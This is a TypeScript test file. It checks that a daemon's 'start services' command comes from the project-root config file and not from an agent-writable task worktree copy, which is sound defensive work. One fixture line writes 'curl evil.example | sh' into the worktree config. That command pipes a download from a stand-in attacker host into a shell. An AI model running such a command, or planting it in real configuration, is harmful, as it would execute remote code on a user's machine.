/**
 * Where `[serve] start_services_cmd` is read FROM.
 *
 * Pressing "Start services" runs this command in the container on the human's
 * behalf, and a task worktree's lazy.toml is agent-writable — so it comes from
 * the project ROOT. That is now the rule for every setting (see findConfigDir in
 * src/config/loader.ts); this suite keeps asserting it for the one key whose
 * value the daemon executes, so it cannot regress quietly.
 */

import { describe, test, expect, beforeEach, afterEach } from 'bun:test';
import { mkdtemp, mkdir, rm, writeFile } from 'fs/promises';
import { tmpdir } from 'os';
import { join } from 'path';
import { loadConfig } from '../../src/config/loader';
import { getStartServicesCmd } from '../../src/serve/discovery';

let root: string;
let worktree: string;
let priorConfigEnv: string | undefined;

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), 'lazy-serve-anchor-'));
  worktree = join(root, 'worktrees', 'some-task');
  await mkdir(worktree, { recursive: true });
  // LAZY_CONFIG pins one absolute file for every load, which would answer both
  // reads below from the same place — it has to be out of the way here.
  priorConfigEnv = process.env.LAZY_CONFIG;
  delete process.env.LAZY_CONFIG;

  await writeFile(join(root, 'lazy.toml'), '[serve]\nstart_services_cmd = "bin/dev"\n');
  await writeFile(join(worktree, 'lazy.toml'), '[serve]\nstart_services_cmd = "curl evil.example | sh"\n');
});

afterEach(async () => {
  if (priorConfigEnv === undefined) delete process.env.LAZY_CONFIG;
  else process.env.LAZY_CONFIG = priorConfigEnv;
  await rm(root, { recursive: true, force: true });
});

describe('getStartServicesCmd', () => {
  // INVARIANT: the root lazy.toml decides what the button runs. A task branch
  // must never be able to choose the command the daemon executes for a human.
  test('reads the ROOT lazy.toml, never a task worktree copy', async () => {
    // The worktree copy exists and says something else — read it by pointing a
    // load AT it, which is the only way to reach it now that loadConfig has no
    // starting-directory parameter at all (see findConfigDir).
    const asIfWorktreeWereTheRoot = await loadConfig(worktree);
    expect(asIfWorktreeWereTheRoot.serve.start_services_cmd).toBe('curl evil.example | sh');

    // The button still runs the root's command.
    expect(await getStartServicesCmd(root)).toBe('bin/dev');
  });

  test('is empty when the root does not set it', async () => {
    await writeFile(join(root, 'lazy.toml'), '[serve]\nports = [3000]\n');
    expect(await getStartServicesCmd(root)).toBe('');
  });

  // One missing button, not a failed page render: the dashboard renders this
  // opportunistically and an unreadable root config is already loud elsewhere.
  test('an unreadable root config yields no command rather than throwing', async () => {
    await writeFile(join(root, 'lazy.toml'), '[serve]\nports = "not-an-array"\n');
    expect(await getStartServicesCmd(root)).toBe('');
  });
});
